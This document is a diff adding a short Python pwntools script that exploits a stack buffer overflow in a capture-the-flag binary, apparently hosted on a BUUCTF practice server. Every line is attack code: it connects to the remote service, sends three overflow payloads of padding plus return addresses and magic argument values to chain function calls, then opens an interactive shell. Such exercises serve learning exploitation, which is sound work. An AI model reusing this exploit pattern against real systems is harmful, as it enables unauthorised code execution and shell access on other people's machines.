@@ -1,0 +1,10 @@
+from pwn import *
+#sh=process("./timu")
+sh=remote("node4.buuoj.cn",25886)
+payload=0x1c*b'a'+p32(0x080485CB)+p32(0x08048714)
+sh.sendline(payload)
+payload1=0x1c*b'a'+p32(0x080485D8)+p32(0x08048714)+p32(0xBAAAAAAD)
+sh.sendline(payload1)
+payload2=0x1c*b'a'+p32(0x0804862B)+p32(0xdeadbeef)+p32(0xDEADBAAD)
+sh.sendline(payload2)
+sh.interactive()
